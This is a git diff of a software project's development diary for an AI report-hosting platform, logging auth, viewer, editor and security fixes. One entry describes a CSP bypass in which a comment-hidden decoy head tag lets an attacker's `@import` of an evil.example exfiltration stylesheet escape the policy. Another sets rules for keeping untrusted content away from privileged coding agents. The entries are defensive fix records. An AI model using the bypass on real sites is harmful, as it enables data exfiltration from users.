@@ -4,16 +4,16 @@
 
 ---
 
-## Current state — 2026-07-06
+## Current state — 2026-07-16
 
 | Field                  | Value                                                                          |
 | ---------------------- | ------------------------------------------------------------------------------ |
-| **Phase**              | **Phase 1 shipped + hardened; auth epic complete; MCP server epic complete + live.** The "stop-the-bleeding" tracks are done: #52 pglite adapter test tier (ADR-0046), #53 per-PR preview isolation (ADR-0047), and **#54 real auth (ADR-0048)** — Clerk sign-in, JIT personal-org provisioning, upload attribution, the session-required flip (DEMO_ACTOR removed), and an app-wide default-protect auth gate (#70). **MCP server (ADR-0051, PRs #87–#92 + completers): remote Streamable-HTTP MCP at `mcp.centaurspec.com`, thin client over `/api/v1`; dual auth — `arp_` API keys (own table, ADR-0008) + Clerk OAuth 2.1 (browser login, OAuth-token forward). Verified live on both paths (incl. bulk report management from Claude Desktop).** Earlier Phase-1 milestones live: async scan pipeline (Phase 1.5a, ADR-0045) and the viewer-origin split `view.<domain>/<slug>` (#41, ADR-0038). Sharing/ACL largely shipped (P1 password #100, allowlist #109, private-by-default #127; `get_acl`/`set_acl` API + MCP live) — `org` mode is still a stub and write grants don't exist; the **ownership & shareability epic (ADR-0059/0060/0061)** now covers both plus per-user ownership. Remaining roadmap: **#55** edge hardening, **#65** app-origin CSP vs Clerk, optional #54 surface (org switcher / folder tree / invites — now scoped under ADR-0061). **UI now wears the "Forge & Ember" warm-dark identity (ADR-0058) — design tokens + brand chrome (Centaur logomark, top bar, avatar menu) + inline report rename + the API-keys/MCP settings reskin (PRs #119/#120/#121/#123).** |
+| **Phase**              | **Phase 1 shipped + hardened; auth epic complete; MCP server epic complete + live.** The "stop-the-bleeding" tracks are done: #52 pglite adapter test tier (ADR-0046), #53 per-PR preview isolation (ADR-0047), and **#54 real auth (ADR-0048)** — Clerk sign-in, JIT personal-org provisioning, upload attribution, the session-required flip (DEMO_ACTOR removed), and an app-wide default-protect auth gate (#70). **MCP server (ADR-0051, PRs #87–#92 + completers): remote Streamable-HTTP MCP at `mcp.centaurspec.com`, thin client over `/api/v1`; dual auth — `arp_` API keys (own table, ADR-0008) + Clerk OAuth 2.1 (browser login, OAuth-token forward). Verified live on both paths (incl. bulk report management from Claude Desktop).** Earlier Phase-1 milestones live: async scan pipeline (Phase 1.5a, ADR-0045) and the viewer-origin split `view.<domain>/<slug>` (#41, ADR-0038). Sharing/ACL largely shipped (P1 password #100, allowlist #109, private-by-default #127; `get_acl`/`set_acl` API + MCP live) — `org` mode is still a stub and write grants don't exist; the **ownership & shareability epic (ADR-0059/0060/0061)** now covers both plus per-user ownership. Remaining roadmap: **#55** edge hardening, **#65** app-origin CSP vs Clerk, optional #54 surface (org switcher / folder tree / invites — now scoped under ADR-0061). **UI now wears the "Forge & Ember" warm-dark identity (ADR-0058) — design tokens + brand chrome (Centaur logomark, top bar, avatar menu) + inline report rename + the API-keys/MCP settings reskin (PRs #119/#120/#121/#123).** **Editing & comments epic SHIPPED + CLOSED (ADR-0062–0067):** the unified in-viewer editor lives at `view.<domain>/<slug>/edit` — one authenticated surface consolidating the ProseMirror editor, comments (ADR-0064, closed-enum `intent` note/enhancement/add/remove + author-or-owner edit), version history + visual diff (ADR-0065), and author display-names from the Clerk identity mirror (ADR-0048, migration 0016 + one-time backfill #205). Reached one-click from the dashboard by any canWrite user; the standalone dashboard editor/versions/diff pages were retired in the Phase-5 cutover. Feedback rounds 1 (#189–#195) + 2 (#196–#201) + polish batch (#204) + backfill (#205) all merged. **Remaining editor payoff: the comment-`intent` agent-action pipeline (PRD #198) — design-first, needs an ADR (ADR-0069 lethal-trifecta surface).** |
 | **Repo path**          | `~/PetProjects/ai-report-platform/` (main). Feature work happens in `worktree/<slug>` (ADR-025), cleaned up on merge. |
-| **Last commit on main**| `e2986b3` — Merge PR #150 (ownership epic completion — org ACL mode + per-report write grants, ADR-0056 P2 / ADR-0060). |
+| **Last commit on main**| `78d84e6` — Merge PR #206 (Terraform reconcile of `VIEW_ACCESS_TOKEN_SECRET` drift via a keepers rotation, applied by the CI apply-prod pipeline). |
 | **Remote**             | `git@github.com:agranado2k/ai-report-platform.git` (public). |
 | **Live infrastructure**| **shared + prod applied — all via the Terraform pipeline on merge (ADR-018), never manually.** Cloudflare zone (DNS-as-code; Clerk custom domain `clerk.centaurspec.com` + `accounts.centaurspec.com` **verified + deployed**), R2 (`tf-state`, `arp-reports-prod`, `arp-reports-ci`; previews namespace within prod via `pr-<N>/`, ADR-0047), Neon **single `main` branch** + per-PR ephemeral branches (ADR-031), Upstash Redis, Vercel `arp-app-prod` (**app.centaurspec.com**, session-gated) + `arp-view-prod` (**view.centaurspec.com**, public viewer) + `arp-mcp-prod` (**mcp.centaurspec.com**, the MCP server — ADR-0051), GitHub repo with ADR-032/0044 protection (**0 required approvals, signed merge commits**). **Clerk:** prod instance (`pk_live`, app.centaurspec.com) **+** staging dev instance (`pk_test`, used by previews — ADR-0048); the `email` session-token claim is set on both; prod Home URL → `https://app.centaurspec.com`. **OAuth app + DCR enabled on the LIVE instance** (for the MCP); **the dev/preview instance still needs the same OAuth app + DCR** (preview OAuth — not blocking prod). |
-| **Active worktrees**   | `worktree/adr-editing-epic` (ADR-0062–0067 docs-integration wave, branch `docs/adr-editing-epic`). `worktree/comments` (ADR-0064 comments & annotations slice 1 — full vertical, branch `feat/comments`, not yet merged; rebased onto PR #150). `worktree/editor-mvp` (ADR-0062 in-dashboard editor, branch `feat/editor-mvp`, not yet merged). `worktree/visual-diff` (ADR-0065 §3/§4 version-history UI + visual diff, branch `feat/visual-diff`, not yet merged). `worktree/sharing-completion` merged (PR #150 — org ACL mode + per-report write grants); `docs/report-ownership-adrs` merged (PR #135 + #136 review-fixes follow-up); `worktree/spike-editor-eval` merged (PR #144). |
+| **Active worktrees**   | `worktree/diary-round2-close` (this housekeeping entry — Current-state refresh + the #204/#205/#206 log entry, branch `docs/diary-round2-close`). All editing-epic worktrees are merged and cleaned up: `adr-editing-epic`, `comments`, `editor-mvp`, `visual-diff`, `comment-ui`, `phase5-cutover`, and the round-1/round-2 feature worktrees (#189–#205). No feature worktree is open — the next build (intent agent-action pipeline, PRD #198) starts design-first. |
 | **Spec status**        | **rev 9** (2026-06-17 decision reconcile — ADR-031 single Neon branch / no persistent staging, ADR-0044 signed merge commits + 0 approvals, ADR-0048 session-gated app, canonical `view.<domain>/<slug>`). ADR-0035–0048 in `docs/adr/`; **ADR-001–030 still inline in `docs/spec.html`** (extraction deferred — INDEX backlog). `docs/events.md` is the canonical event registry; the `docs:check` conformance gate is green. |
 
 ### Open questions / unresolved decisions
@@ -2326,6 +2326,92 @@ stays gated on its `/security-review` pass.
 
 Worktree: `worktree/comment-ui` (branch `feat/comment-ui`). Not yet merged.
 
+### 2026-07-08 — G4 build: domain-keyed team orgs (ADR-0068, issue #141, epic #142)
+
+Implemented ADR-0068's build order in one PR (TDD throughout):
+
+- **§1 domain rule**: `packages/domain/src/org-key.ts` — `resolveOrgKey(email)`, a pure Value
+  Object. An explicit `PUBLIC_PROVIDER_DOMAINS` set (gmail/googlemail/outlook/hotmail/live/yahoo/
+  icloud/me/proton.me/protonmail/aol/gmx) → `personal` org keyed by the full normalized address;
+  every other domain → `team` org keyed by the domain. Exact whole-domain matching only — no
+  substring/suffix — so `notgmail.com` and an unlisted public-provider subdomain (e.g.
+  `mail.yahoo.co.jp`) are both their own `team` domains, and a two-level-TLD domain (`acme.co.uk`)
+  is keyed by the FULL string, not an eTLD+1 guess. 19 unit tests including the boundary cases.
+- **§2 `orgs.kind` migration**: new `org_kind` enum (`personal`|`team`) + `orgs.kind NOT NULL
+  DEFAULT 'personal'`, migration `0014` (0013 was already claimed by the comments epic on
+  `origin/main` by the time this PR branched). Default keeps every existing org behavior-neutral.
+- **§3 JIT join-or-create provisioning**: `ClerkOrgProvisioner` (adapters) grows
+  `findTeamOrgByDomain` / `createTeamOrg` / `ensureMembership` — the port speaks in plain email
+  domains; the adapter derives a Clerk-safe slug internally (dots → hyphens) so a domain like
+  `housenumbers.io` always resolves to the same Clerk org via `getOrganization({slug})`.
+  `ensureMembership` is idempotent (membership-list check-then-act, plus a 422-from-Clerk fallback
+  for the rare concurrent double-join). `IdentityStore.createPersonalIdentity` is renamed to
+  `createIdentity` and takes an explicit `kind: OrgKind` — its org upsert was ALREADY a
+  find-or-create keyed on `clerk_org_id` (existing row wins on conflict), so a second colleague
+  joining a domain's team org mirrors a distinct `User` under the SAME `Org` + Root folder with no
+  change to that mechanic, just the added `kind` on first creation. `provisionIdentity` derives the
+  org key up front and branches: an already-active session org is trusted as-is (one-user-one-org
+  invariant); otherwise personal keeps the unchanged `createPersonalOrg` path, team finds-or-joins
+  the domain org. All 825 workspace tests green after the change (pglite integration covers a
+  second colleague joining the same team org: same `Org`/root folder, distinct `User`).
+- **§4 membership mirroring — evaluated, deliberately NOT wired**: this store has no local
+  membership join table (`users`/`orgs` are independent mirror rows); every authorization gate
+  that matters (`orgUnlock`, JIT provisioning) checks Clerk's LIVE session/API, not a cache. Wiring
+  `organizationMembership.deleted` also wouldn't durably remove a member anyway — under
+  domain-keyed JIT join-or-create, a removed member who signs in again silently re-derives and
+  rejoins the SAME team org (an ADR-0068-accepted trade-off) — persistent removal needs a
+  "don't-auto-rejoin" mechanism this epic doesn't build. Documented inline in `webhooks.clerk.ts`
+  rather than shipping a placebo handler; `user.deleted` (ADR-0054) is unchanged.
+- **Copy fix**: `orgMembershipNotice` in `unlock.$slug.tsx` no longer says "switch your active
+  organization and retry" — there is no switching under one-org-per-user.
+- **§6 fixture-backed e2e**: `tests/e2e/support/clerk-session.ts` grows `mintTestSessionFor`/
+  `mintSecondTestSession` for the hand-provisioned `silver+clerk_test@agranado.com` (a Clerk
+  `+clerk_test` test-mode address, code `424242`; domain `agranado.com` is off the public-provider
+  list → a `team` org). New `tests/e2e/smoke/team-org-upload.feature(.steps.ts)` — signs in as the
+  second identity and uploads, exercising the team-org join-or-create branch against REAL Clerk +
+  infra (first live verification of ADR-0068 §3 beyond unit/adapter tests); wired into the existing
+  `@auth` gate, no new CI secrets. `tests/e2e/README.md` (new) documents both fixtures'
+  identifiers/expected-org/reconstruction steps (the accepted ADR-017 exception). The two
+  `@phase-2 @wip` scenarios in `sharing-modes.feature`/`report-write-grants.feature` stay `@wip`:
+  the second identity existing is necessary but not sufficient — discovered that NEITHER file has
+  any step definitions at all, and `playwright.config.ts`'s `testDir` doesn't collect
+  `tests/e2e/features/**` yet (a pre-existing gap predating this PR, visible in that file's own
+  comments and `.github/workflows/e2e.yml`'s). Noted precisely inline rather than faking coverage;
+  authoring the full step-definition layer for the product `.feature` files is separate, sizeable
+  follow-up work.
+- **Docs**: `docs/db-design.md`'s `org_kind`/`kind` rows updated to point at migration `0014` and
+  ADR-0068's derivation-at-provisioning framing (the glossary was already updated by ADR-0068
+  itself and needed no further change).
+
+Worktree: `worktree/team-orgs` (branch `feat/team-orgs`). Not yet merged.
+
+**Review wave (same day, pre-merge):** the dual review (claude-review bot + local two-agent pass)
+caught one **critical** — the team-org slug's bare dot→hyphen mapping is not injective, and with
+JIT auto-join a slug collision is a tenant-boundary crossing (registrable `acme-co.uk` vs
+`acme.co.uk`). Fixed: hash-suffixed slugs + a fail-closed `publicMetadata.domain` anchor check
+before any join. Also from review: create-race recovery (two first sign-ups at a new domain no
+longer 500 the loser), `ensureMembership` matches Clerk's already-a-member error by CODE (a bare
+422 swallow also covered quota-exceeded), OAuth provisioning uses verified emails only (the email
+domain IS the tenancy boundary), the public-provider list grew 12 → ~90 domains (a missed provider
+= a shared team org for strangers), FQDN trailing-dot normalization, and a real hard-DELETE FK
+cascade test. Implementation resolutions recorded in ADR-0068's More-information block (webhook
+drop, sticky orgs, cutover semantics). Operator to-dos at merge: delete the stale `agranado-com`
+dev-Clerk org (slug scheme changed); run the one-query prod check for pre-existing corporate-domain
+users; confirm the Clerk instances block unverified sign-ins (ADR-0068 hard dependency).
+
+**Preview-down addendum (same day):** after merging main back in, the PR's preview 500'd on every
+route — `SyntaxError: The requested module '@clerk/backend/errors' does not provide an export named
+'isClerkAPIResponseError'` at module load. Root cause: a two-major version skew. `packages/adapters`
+declared `@clerk/backend@^3.7.1` (whose `/errors` subpath exports the guard), but on Vercel the
+adapter is bundled into `apps/app`'s server build and the externalized `@clerk/backend` import
+resolves from `apps/app`'s node_modules → `2.33.5` (pinned alongside `@clerk/remix@4.x`), whose
+`/errors` subpath exports NO guard — so the import crashed every route, while unit tests (resolving
+the adapter's own 3.7.1) stayed green. Fix: a local STRUCTURAL guard (`clerkError === true` +
+`status` + `errors[]` — the shape both majors stamp on instances via `@clerk/shared`), no
+`@clerk/backend/errors` import at all, and `packages/adapters` re-pinned to `^2.33.0` so
+typecheck/tests exercise the same major production runs. Lesson recorded: `instanceof`-based SDK
+guards are unsafe in this monorepo whenever two copies of the SDK can coexist in one process.
+
 ### 2026-07-08 — Version history UI + visual diff (ADR-0065 §3/§4)
 
 Built the dashboard-facing half of ADR-0065: a version-history page and a visual diff between two
@@ -2414,3 +2500,659 @@ work) and the ADR-0062 `_source.json` sidecar.
   tests green, `docs:check` clean.
 
 Worktree: `worktree/visual-diff` (branch `feat/visual-diff`). Not yet merged.
+
+### 2026-07-08 — Development-agent trust boundary (ADR-0069)
+
+Auditing an external AI coding-agent runtime (`obra/lace`, requested as a comparison for our own Claude
+Code tooling) surfaced a concrete gap: lace auto-spawns project-scoped MCP servers from a repo-tracked
+`.lace/mcp-config.json` with no visible trust prompt — opening a malicious clone could run an
+attacker-controlled process with whatever credentials that session held. The audit itself was done safely
+by delegating the clone-and-read work to tool-restricted `Explore` subagents with no push/send/deploy
+capability, while the privileged orchestrator only ever consumed their already-read-only output — i.e. by
+accident, applying the "lethal trifecta" compartmentalization principle (private data + untrusted content
++ external-action capability must not sit in one context) that this repo's own product architecture
+already applies to untrusted report HTML (ADR-0045's "isolation > AV", ADR-0062 §9's app-origin trust
+boundary).
+
+**ADR-0069** formalizes the same principle for this repo's *development*-agent tooling: classifies
+Private / Untrusted / External-action capability legs, requires untrusted-content reads to be delegated to
+a tool-restricted subagent whose output is treated as data-not-instructions, requires the privileged
+orchestrator not to fetch-and-act on untrusted content in the same step, and pre-emptively requires
+explicit user trust before any future project-scoped MCP config auto-spawns servers (none exists in this
+repo today). Explicitly scoped as risk reduction, not a guarantee — enforcement is procedural (cited from
+`CLAUDE.md`, checked in `/code-review`/`/security-review`), not a runtime hook; hard enforcement was
+considered and deferred pending Phase 0e's hook infrastructure. `CLAUDE.md` gained a new "Agent trust
+boundary" section pointing to it.
+
+Worktree: `worktree/adr-agent-trust-boundary` (branch `docs/adr-agent-trust-boundary`). Not yet merged.
+
+### 2026-07-08 — PROD DOWN incident: jsdom un-shippable on serverless → linkedom (PRs #163, #167)
+
+After the editing epic's PRs merged, **every `app.centaurspec.com` route 500'd at boot** — surfaced when
+the operator hit `/reports/{slug}/open`. Root cause: PR #151 put `arp-report-html` (→ jsdom) into
+`apps/app`, and jsdom@29's dependency subtree is repeatedly un-shippable on Vercel's serverless runtime.
+Two layers, fixed in sequence:
+
+- **Layer 1 (#163)** — `css-tree` (transitive jsdom dep) `require`s `data/patch.json` at load; the SSR
+  bundler was *inlining* jsdom and mangling that relative require, so Vercel never shipped the file →
+  `Cannot find module '../data/patch.json'`. Fix mirrored the argon2 precedent (bb1457c): `ssr.external`
+  += jsdom, declare it directly in `apps/app`. Correct for layer 1 — but externalizing then exposed…
+- **Layer 2 (#167)** — with jsdom loading as real modules, `html-encoding-sniffer@6` (CJS) `require()`s
+  the **ESM-only** `@exodus/bytes` → `ERR_REQUIRE_ESM`, crashing every route again. **Decision: stop
+  patching jsdom's tree.** `report-html` needs only `createElement` + `innerHTML`; swapped the server DOM
+  backend to **linkedom** — serverless-native, no native binaries, data files, or ESM-interop landmines.
+  jsdom / css-tree / html-encoding-sniffer / @exodus/bytes are gone from the bundle. Verified against a
+  live app preview (`/reports/{slug}/versions` → 302, not 500). The backend note lives in ADR-0062 §3
+  (linkedom preserves `style` verbatim — a fidelity improvement; fidelity stays 15/15, no data migration).
+
+Vendor change, per the diary protocol. **Process gaps this exposed (follow-ups filed):** #166 — the
+preview smoke only exercises the *view* app, so an app-origin boot crash sailed through CI (add a smoke
+on an app route that imports report-html — the exact check that would have caught both layers). #165 —
+split report-html's server-only DOM helper so a DOM-backend problem can't crash DOM-free routes like
+`/open`. Also this session: Vercel free-tier daily deploy quota (100/day, HTTP 402) blocked CI and prod
+recovery repeatedly → upgraded to Pro.
+
+### 2026-07-08 — Viewer ?v=N version serving implemented (issue #155)
+
+ADR-0038 §3 always specified `?v=N` access to non-live versions ("same ACL + same scan-status state
+machine as the live URL"), and ADR-0065 §5 / the #156 versions-page "View" links assumed it worked —
+but `apps/view/$slug.tsx` never read the param and always served the live version. Closed the gap:
+
+- `parseVersionQuery` (pure): strict `^\d+$`; missing/malformed → absent → serve live (unchanged
+  default). Deliberately no 404 on malformed input — avoids a parse-vs-not oracle; out-of-range 0/negative
+  is a resolver-layer 404, kept in one place.
+- `resolveViewableReport` gains an optional `requestedVersionNo`: resolves the `ReportVersion` with that
+  `versionNo` and maps its OWN `scan_status` through the **identical** table the live path uses — clean →
+  serve, pending → scanning holding page, flagged → 451, blocked/unknown-N → reason-opaque 404 (no
+  version-count leak). Takedown → 410 at any N. The ACL gate (`resolveAccessDecision`) is applied AFTER,
+  unchanged — `?v=N` is the same gate on a different version, not a bypass (per ADR-0038 §3's note that the
+  ordinal grants nothing beyond the slug capability).
+- Headers/CSP/noindex identical to live. No change to the live-serving path when `v` is absent.
+
+Fully TDD (version-query parser + resolver scan-status matrix: clean N, pending→scanning, flagged→451,
+blocked→404, out-of-range→404, takedown-at-any-N, non-clean-liveVersionId defense-in-depth) — that unit
+matrix is the actual regression net. The pre-existing `view-version-by-ordinal.feature` (registered on
+main) is spec-only Gherkin, like every `.feature` in the repo (no step defs under `tests/e2e/steps/` yet)
+— living documentation, not executed e2e. No ADR change needed — this makes code match ADR-0038's existing
+contract; ADR-0065 §5's "?v=N unchanged" stays accurate (0065 didn't touch it). Fixes the dead "View"
+links the #156 version-history page shipped.
+
+### 2026-07-08 — Post-merge dogfood on the ownership epic → viewer gate-order fix
+
+Ran `/ce-dogfood` against live prod after the epic merged (report:
+`docs/dogfood-reports/2026-07-08-ownership-epic.md`; 15/16 assertions passed — ownership on the
+wire, creator-is-owner, owner-conditional acl, G3 scope denials, viewer/private gates, problem+json
+401s all verified live with a created-then-deleted probe report). The one failure: the viewer served
+the ADR-0038 §2 `200` "Scanning…" holding page BEFORE the ADR-0056 access decision, so a PRIVATE
+report mid-scan revealed its existence and scan state to any slug-holder (a 200-vs-302/404 oracle
+during the scan window). ADR-0038's original "intentional leak" rationale assumed slugs are
+owner-shared capabilities — true pre-ADR-0056, not since private-by-default.
+
+Fix (`fix/viewer-acl-before-scan`): `ViewOutcome.scanning` now carries the report; the route runs
+`resolveAccessDecision` first for both `serve` and `scanning`, and only an admitted visitor (owner
+via `/open`, org member, grantee, or anyone for `public`) sees the holding page — everyone else gets
+the identical unlock redirect the clean version would give them. `deleted`/`flagged`/`notfound`
+(410/451/404) stay pre-gate reason-opaque terminal states (documented contract; the flagged-451
+variant of this question is noted in the PR as a deliberate non-change). ADR-0038 gained a dated
+amendment section; `sharing-modes.feature` gained the two mid-scan scenarios (spec-only Gherkin,
+like the rest). Dogfood observations logged, no action: `reports_list_write_grants` (a read) sits
+behind `acl:write`; the app origin serves no CSP (viewer-only header stack is per ADR-013); `/open`
+drops the deep link for signed-out owners (deliberate anti-oracle collapse).
+
+Worktree: `worktree/viewer-acl-before-scan` (branch `fix/viewer-acl-before-scan`). Not yet merged.
+
+### 2026-07-08 — Editor MVP dogfood fixes: shell CSS, comment highlights, inline-content structure
+
+Operator dogfooded the PR #151 editor MVP and found it poor on three counts, all root-caused and fixed
+in one pass (`worktree/editor-styling-fix`, branch `feat/editor-styling-fix`):
+
+1. **Lost styling (dominant defect).** `reports.$slug.edit.tsx`'s loader called `splitShell(html)` and
+   discarded the `shell` half — the report's own `<style>` never reached the client, and
+   `ReportEditor.tsx` mounted `EditorView` into a bare `<div class="report-editor prose …">` with no CSS
+   backing either class. Every bespoke class (chips/cards/sections/rt/rd/…) rendered unstyled. Fixed by
+   returning `shell` from the loader (save path untouched — the action already re-splits server-side) and
+   mounting `EditorView` **inside a same-origin, sandboxed `<iframe>`** built from that shell
+   (`apps/app/app/editor/iframe-document.ts`'s `buildIframeDocument`, pure/unit-tested). The iframe's own
+   `<body>` — carrying the shell's original classes/attrs — becomes the PM editable root directly via
+   `new EditorView({ mount: body }, …)`, so the editing surface now renders with the report's real CSS,
+   isolated automatically from the dashboard's own `tailwind.css` in both directions.
+2. **Comment highlights invisible.** `comment-decorations.ts` already dispatched
+   `Decoration.inline(from, to, { class: "comment-highlight" })`, but no `.comment-highlight` CSS rule
+   existed anywhere. Added it to the iframe's injected `<style>` (same document as the decorated spans):
+   a translucent brass highlight (`rgba(244,201,93,.28)` background + inset box-shadow), legible on the
+   fixture's warm-dark palette.
+3. **Structure flattening.** The generic attr-retention catch-all (`content: 'block*'`) folded
+   `rt`/`rd`/`rtags`/`chips`/`block-label` into itself and auto-wrapped their bare inline content
+   (text/chip spans) in a `<p>` — extra DOM layer, broken flex/gap layouts, shifted selection. Added
+   dedicated `content: 'inline*'` node specs for those five (`packages/report-html/src/schema/
+   inline-content.ts`) — verified against every fixture occurrence (52× rt/rd/rtags, 25× chips, 14×
+   block-label) that none ever holds a nested block element. `role-head` stays on the generic catch-all
+   (4/7 occurrences mix inline content with a block `<h3>`); `rmeta` is pure-inline too but was judged out
+   of scope for this pass (not named in the fix brief) — left on the catch-all, with a note in the code
+   for whoever picks it up next. A CSS safety net (`.rt>p,.rd>p,.rtags>p,.chips>p,.block-label>p{margin:0;
+   display:contents}`) covers any residual auto-`<p>` from containers this pass didn't touch.
+
+**Security (ADR-0062 §9 amended, not superseded):** the shell's `<style>` is untrusted uploaded CSS now
+actually rendering on the app.<domain> origin (previously discarded, so this exposure is new). The iframe
+carries its own `Content-Security-Policy` meta tag — `default-src 'none'; style-src 'self'
+'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; base-uri 'none'` — inserted as `<head>`'s
+first child, before the report's own `<style>`. `sandbox="allow-same-origin"` (required for the parent to
+reach `contentDocument` at all) but deliberately **no** `allow-scripts` — PM's event listeners attach from
+the parent's JS context (a same-origin DOM op, not iframe-script execution), and the iframe document never
+emits a `<script>` tag. This is a second, independent containment layer on top of (not a replacement for)
+the existing schema-is-the-allowlist boundary §9 already documents.
+
+Round-trip fidelity suite stayed **15/15** (the count-based class-preservation contract doesn't care about
+the wrapping-div change); `auto-wrap.test.ts`'s pinned `.chips` case moved to `inline-content.test.ts`
+(new behavior) while its `.card` case stays as the accepted-cost contract for genuinely mixed
+inline/block containers. Fully TDD: `inline-content.test.ts` (schema), `iframe-document.test.ts` (pure
+string-building, unit-tested even though the iframe mount itself is manual/e2e territory per the task
+brief). Gates green: biome, typecheck, vitest (1020+ tests), docs:check. Not yet merged.
+
+### 2026-07-08 — Blocker security fix: `buildIframeDocument`'s CSP insertion was regex-foolable
+
+A security review of the fix above (same worktree, `worktree/editor-styling-fix`) found the CSP `<meta>`
+insertion itself exploitable: `buildIframeDocument` located `<head>`/`</head>` in `shell.pre` —
+**fully attacker-controlled** HTML (`splitShell` only requires a later `<body …>` tag to exist) — with
+`HEAD_OPEN_RE = /<head[^>]*>/i` + `shell.pre.lastIndexOf("</head>")`. A shell carrying a decoy
+head-shaped string inside an HTML comment (`<!-- decoy <head foo> -->`) fools the regex into matching the
+decoy as "the" head-open tag; the CSP meta gets spliced into that dead comment text (inert, never parsed),
+while `lastIndexOf("</head>")` still finds the real `</head>` — so the real head, carrying the attacker's
+`@import url(https://evil.example/exfil.css)` exfil style, ships with **no CSP at all**. Since the shell's
+`<style>` is opaque to `sanitizeStyle` (never schema-governed, ADR-0062 §9), the CSP meta was the *only*
+mitigation for that block — and it was defeated.
+
+Fixed (TDD — adversarial test written first, confirmed failing against the regex code, then green after
+the fix) by replacing the regex/`indexOf` scan with a real, **comment-aware HTML parser**:
+`buildIframeDocument` now parses `shell.pre + shell.post` in full, inserts the CSP `<meta>` as the parsed
+`<head>`'s first ELEMENT child (highlight/safety-net `<style>` as its last child), and rebuilds the output
+from that `<head>`'s and `<body>`'s own serialized `outerHTML` — never trusting the parser's internal tree
+shape (a genuinely headless input can produce a quirky implied-tag placement in some parsers; detected via
+`documentElement.tagName !== "HTML"` and routed to the pre-existing synthetic-wrapper fallback, which stays
+regex-free and safe regardless since there's no real head to protect in that case).
+
+**Parser choice, and why:** `buildIframeDocument(shell, parseHtml = domParserParse)` takes an injectable
+parser. Production (`ReportEditor.tsx`, browser-only — this function is called from a `useMemo` in a
+mounted React component) uses the default: the browser's own native `DOMParser` — comment-aware, zero
+added client bytes, and (being a lazy default parameter) never referenced under Node. The unit suite
+(`iframe-document.test.ts`) injects `linkedom`'s `parseHTML` instead — already a workspace dependency
+(`arp-report-html`'s server-side DOM backend, `dom-environment.ts`) and, like `DOMParser`, a real
+comment-aware HTML5 parser — so the adversarial tests run under this repo's only unit-test environment
+(vitest's plain `node`, per root `vitest.config.ts`; jsdom was removed as un-shippable, happy-dom was never
+installed) without adding a new DOM-environment devDependency or a heavier parser to the client bundle.
+This mirrors the dependency-injection pattern `dom-environment.ts` already uses (`typeof document !==
+"undefined" ? document : parseHTML(...)`), just inverted (browser-native default, test-injected fallback).
+
+**Secondary hardening in the same fix:** dropped `'self'` from `style-src`/`img-src` — reports are
+self-contained (verified: zero `url(...)`/`@import` occurrences of any kind in the
+`ai-readiness-report.html` fixture), so `'self'` only ever bought a same-origin, cookie-bearing
+request-forgery surface against the app.<domain> origin, never a legitimate report asset. New CSP:
+`default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'`.
+`'unsafe-inline'`/`data:` stay (needed for the report's own inline `<style>` and any inlined images/fonts).
+
+Scope note: this re-parse is the **editor's render surface only**. The saved artifact still round-trips
+through `reinjectShell`'s byte-exact string concatenation (`packages/report-html/src/shell.ts`), which this
+fix does not touch.
+
+`docs/adr/0062-editing-model-report-html-schema.md` §9 gained "Amendment 2" documenting the parser fix and
+the CSP tightening. Gates green: `pnpm install`, `biome ci .` (clean save one pre-existing, unrelated
+fixture CSS-specificity warning), `turbo typecheck`, `vitest run` (1023 tests, 135 files), `docs:check`.
+
+### 2026-07-09 — First authenticated-BROWSER e2e smoke (editor coverage gap)
+
+The dashboard report editor broke twice in prod **behind auth** (#171 unstyled, #172
+`ReferenceError: DOMParser is not defined` SSR 500) and CI caught neither. Root cause: every existing
+`@auth` e2e (`tests/e2e/smoke/auth-upload.feature`) is `request`-only (API calls + a Bearer JWT minted via
+the Clerk backend REST API) — no scenario ever opened a page in a real browser as a signed-in user. The
+one editor-route smoke that exists, `app-route-boot.feature`, deliberately asserts the **unauthenticated**
+302→`/sign-in` (proves the route's module graph — `arp-report-html` import included — boots without a
+serverless crash); it's explicitly auth-agnostic and never reaches `ReportEditor`, so it structurally
+could not have caught either regression.
+
+Added in `worktree/editor-auth-smoke` (branch `test/editor-auth-smoke`, not yet merged): a real
+authenticated-browser Playwright project, `chromium-auth`, alongside the existing unauthenticated
+`chromium` project.
+
+- **`@clerk/testing@2.2.5`** (root devDependency) — its `/playwright` export gives `clerkSetup`,
+  `setupClerkTestingToken`, and the `clerk` helper (`signIn`/`signOut`/`loaded`). Its built-in
+  `clerk.signIn({ page, emailAddress })` convenience path was deliberately NOT used — it reads
+  `process.env.CLERK_SECRET_KEY` directly (hardcoded name, no override), which doesn't match this repo's
+  `E2E_`-prefixed env convention. Instead: `mintSignInTicketFor`/`mintPrimarySignInTicket` (new in
+  `tests/e2e/support/clerk-session.ts`, mirroring the existing `mintTestSessionFor` shape) mint a Clerk
+  **sign-in ticket** (`POST /sign_in_tokens`) via the same `clerkFetch` primitive, then
+  `clerk.signIn({ page, signInParams: { strategy: 'ticket', ticket } })` — the browser's own
+  `Clerk.client.signIn.create` consumes it, so the resulting session is a real interactive-equivalent
+  sign-in, not a synthetic header.
+- **`tests/e2e/support/clerk-auth.setup.ts`** — a Playwright **setup project** (plain `@playwright/test`
+  spec, not BDD): `clerkSetup({ publishableKey, secretKey })` (both passed explicitly — the package's own
+  env fallbacks, e.g. `NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY`, don't match this repo's names either) →
+  `setupClerkTestingToken({ page })` (must be registered before any FAPI request, i.e. before `page.goto`)
+  → ticket sign-in → `page.context().storageState({ path: "tests/e2e/.auth/primary.json" })`. The state
+  file is gitignored (`.gitignore` gained a `tests/e2e/.auth/` entry) — never commit session state.
+- **`playwright.config.ts`** gained three projects: `setup` (the spec above, own `grep`/`grepInvert`
+  override since it carries no Gherkin tags and would otherwise be excluded by the top-level `/@smoke/`
+  grep), `chromium` (unchanged behavior, but now ALWAYS excludes `@browser` regardless of creds — it has
+  no storageState, so it can't run an authenticated scenario), and `chromium-auth` (`dependencies:
+  ["setup"]`, `storageState` applied, `grep: /@browser/` so it runs only the new scenario). The `@browser`
+  gate composes with the existing `@auth` gate: needs `E2E_CLERK_SECRET_KEY` + `E2E_TEST_USER_EMAIL` (same
+  pair `@auth` needs) **plus** `E2E_CLERK_PUBLISHABLE_KEY` (new — the ticket exchange runs client-side via
+  `@clerk/clerk-js`, which needs the publishable key to initialize `window.Clerk`). Verified with
+  `playwright test --list` under three env combinations: none of the three creds → `@browser` absent
+  entirely; `@auth` creds only (no publishable key) → `@auth` scenarios run, `@browser` still absent; all
+  three → `@browser` appears, only under `chromium-auth`, never under `chromium`.
